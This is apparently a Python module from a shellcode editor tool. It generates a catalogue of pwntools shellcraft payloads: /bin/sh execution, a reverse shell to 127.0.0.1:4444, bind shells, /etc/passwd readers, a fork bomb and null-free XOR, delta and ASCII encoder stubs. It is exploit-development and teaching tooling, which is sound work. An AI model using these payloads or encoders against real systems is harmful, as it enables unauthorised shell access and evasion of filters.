"""Library entries generated from pwntools' shellcraft.

These are produced by pwntools at runtime (shellcraft source assembled to
bytes) and loaded into the editor as raw bytes: the editor disassembles them
with Capstone, so what you see is our own disassembly of the real payload.

Generation needs pwntools plus the assemblers it shells out to (binutils, the
aarch64 cross binutils, and cpp). If any of that is missing the generation
fails gracefully and only the hand-written entries are served.
"""

import functools
import logging
import re

from .engine import align_comments, faithful_asm

log = logging.getLogger("shelldev.pwn")

# pwntools arch name -> our arch key.
ARCHES = {"i386": "x86", "amd64": "x64", "aarch64": "arm64"}

# The complete standalone payloads worth offering (pwntools shellcraft also
# exposes ~500 one-per-syscall wrappers, which are primitives, not payloads;
# those are deliberately left out). (slug, name, category, description,
# factory). The factory takes the per-arch `shellcraft.<arch>.linux` module
# and returns the asm source. An entry is created only for the architectures
# where generation succeeds, so arch-specific templates (bindsh, findpeersh,
# readfile, …) appear only where pwntools provides them.
SPECS = [
    ("sh", 'execve("/bin/sh")', "exec",
     "Spawns /bin/sh (execve).", lambda m: m.sh()),
    ("exit", "exit(0)", "exit",
     "Clean exit(0).", lambda m: m.exit(0)),
    ("dupsh", "dupsh (socket → shell)", "shell",
     "Duplicates a connected socket to stdin/stdout/stderr and runs a shell.",
     lambda m: m.dupsh()),
    ("findpeersh", "findpeersh", "shell",
     "Finds the connected peer socket and runs a shell over it.",
     lambda m: m.findpeersh()),
    ("reverse", "reverse TCP shell 127.0.0.1:4444", "reverse shell",
     "Connects back to 127.0.0.1:4444 and runs a shell (connect + dupsh).",
     lambda m: m.connect("127.0.0.1", 4444) + m.dupsh()),
    ("bind", "bind TCP shell :4444", "bind shell",
     "Listens on :4444 and runs a shell (listen + dupsh).",
     lambda m: m.listen(4444) + m.dupsh()),
    ("bindsh", "bindsh :4444", "bind shell",
     "pwntools native bind shell on :4444 (bindsh).",
     lambda m: m.bindsh(4444)),
    ("cat", 'cat("/etc/passwd")', "read file",
     "Prints /etc/passwd to stdout (cat).", lambda m: m.cat("/etc/passwd")),
    ("cat2", 'cat2("/etc/passwd")', "read file",
     "Prints /etc/passwd to stdout, sendfile variant (cat2).",
     lambda m: m.cat2("/etc/passwd")),
    ("readfile", 'readfile("/etc/passwd")', "read file",
     "Reads /etc/passwd and writes it to stdout (readfile).",
     lambda m: m.readfile("/etc/passwd", 1)),
    ("echo", 'echo("shelldev")', "write",
     'Writes "shelldev" to stdout (echo).', lambda m: m.echo("shelldev\n")),
    ("forkbomb", "fork bomb", "misc",
     "Forks forever (fork bomb).", lambda m: m.forkbomb()),
    ("forkexit", "fork, parent exits", "misc",
     "Forks and exits the parent, continuing in the child (forkexit).",
     lambda m: m.forkexit()),
    ("killparent", "kill parent", "misc",
     "Kills the parent process (killparent).", lambda m: m.killparent()),
]

# Decoder stubs: pwntools encoders that wrap a payload (here execve /bin/sh)
# in a self-decoding, null-free stub, all self-contained (no pre-set register).
# Only encoders whose architecture the editor can disassemble are included;
# pwntools' other encoders target 32-bit ARM and MIPS, which the editor has no
# mode for.
# (our arch, pwntools arch, encoder module, slug, name, description, call)
DECODER_SPECS = [
    ("x86", "i386", "pwnlib.encoders.i386.xor", "xor", "XOR decoder → /bin/sh",
     'pwntools i386 XOR decoder stub around execve("/bin/sh"); self-locating '
     "(FPU GetPC) and null-free.",
     lambda enc, raw: enc(raw, b"\x00")),
    ("x86", "i386", "pwnlib.encoders.i386.delta", "delta", "delta decoder → /bin/sh",
     'pwntools i386 delta decoder stub around execve("/bin/sh"); null-free.',
     lambda enc, raw: enc(raw, b"\x00")),
    ("x64", "amd64", "pwnlib.encoders.amd64.delta", "delta", "delta decoder → /bin/sh",
     'pwntools amd64 delta decoder stub around execve("/bin/sh"); null-free.',
     lambda enc, raw: enc(raw, b"\x00")),
    ("x86", "i386", "pwnlib.encoders.i386.ascii_shellcode", "ascii", "ASCII decoder → /bin/sh",
     'pwntools i386 ASCII decoder around execve("/bin/sh"): the whole payload '
     "is printable ASCII and null-free, rebuilt on the stack with sub/push "
     "(self-contained, no register setup needed).",
     lambda enc, raw: enc(raw)),  # default avoid = printable 0x21-0x7e
]

def _shellcraft_anchors(source: str) -> list:
    """Pull ordered (mnemonic, comment) anchors out of shellcraft asm source.
    shellcraft writes Intel-syntax asm with /* ... */ comments: standalone lines
    that describe the block that follows, and inline comments after an
    instruction. Each instruction's comment is its inline one if present, else
    the nearest preceding standalone comment."""
    anchors = []
    pending = None
    for raw in source.splitlines():
        line = raw.strip()
        if not line:
            continue
        inline = None
        m = re.search(r"/\*(.*?)\*/\s*$", line)
        if m:
            inline = m.group(1).strip()
            line = line[: m.start()].strip()
        if not line:  # a standalone comment line
            if inline:
                pending = inline
            continue
        if line.endswith(":") or line.startswith("."):  # label / directive
            continue
        mnem = line.split()[0].lstrip(".").lower()
        comment = inline or pending
        pending = None
        if comment:
            anchors.append([mnem, comment])
    return anchors


def _dummy_tag(net: bool, text: str) -> str:
    compact = text.replace(" ", "").lower()
    if net and "100007f" in compact:
        return "LHOST 127.0.0.1"
    if net and ("5c11" in compact or "115c" in compact):
        return "LPORT 4444"
    return ""


def _compose(net: bool, text: str, src_comment) -> str:
    tag = _dummy_tag(net, text)
    comment = src_comment or ""
    if tag:
        comment = (comment + " — " if comment else "") + tag + " (dummy)"
    return "  " + text + (f"   // {comment}" if comment else "")


def _entry(id, name, arch, category, kind, description, code, source=None, net=False) -> dict:
    lines = faithful_asm(arch, code, 0x1000)
    anchors = _shellcraft_anchors(source) if source else []
    cmts = align_comments(lines, anchors)
    asm = "\n".join(_compose(net, ln, cmts[i]) for i, ln in enumerate(lines))
    return {
        "id": id, "name": name, "arch": arch, "os": "linux",
        "category": category, "kind": kind, "source": "pwntools",
        "description": description, "address": 0x1000, "size": len(code),
        "load": "asm", "asm": asm, "preview": asm,
    }


def _build() -> list[dict]:
    import importlib
    import os
    os.environ.setdefault("PWNLIB_NOTERM", "1")
    os.environ.setdefault("PWNLIB_SILENT", "1")
    from pwn import asm, context, shellcraft

    entries = []
    for pwn_arch, arch in ARCHES.items():
        linux = getattr(shellcraft, pwn_arch).linux
        for suffix, name, category, description, factory in SPECS:
            try:
                context.clear()
                context.arch = pwn_arch
                context.os = "linux"
                source = factory(linux)
                code = asm(source)
            except Exception as e:  # one payload failing shouldn't drop the rest
                log.warning("pwntools %s/%s failed: %s", arch, suffix, e)
                continue
            entries.append(_entry(f"pwn-{arch}-{suffix}", name, arch, category,
                                  "payload", description, code, source=source,
                                  net=suffix in ("reverse", "bind")))

    # Decoder stubs: encode execve("/bin/sh") with each pwntools encoder.
    for arch, pwn_arch, modpath, slug, name, desc, call in DECODER_SPECS:
        try:
            encode = importlib.import_module(modpath).encode
            context.clear()
            context.arch = pwn_arch
            context.os = "linux"
            raw = asm(getattr(shellcraft, pwn_arch).linux.sh())
            code = call(encode, raw)
        except Exception as e:
            log.warning("pwntools decoder %s/%s failed: %s", arch, slug, e)
            continue
        entries.append(_entry(f"pwn-dec-{arch}-{slug}", name, arch,
                              "decoder", "decoder", desc, code))
    return entries


@functools.lru_cache(maxsize=1)
def entries() -> list[dict]:
    """Generated pwntools entries, built once. Empty if pwntools or its
    assemblers aren't available."""
    try:
        return _build()
    except Exception as e:
        log.warning("pwntools catalog unavailable: %s", e)
        return []
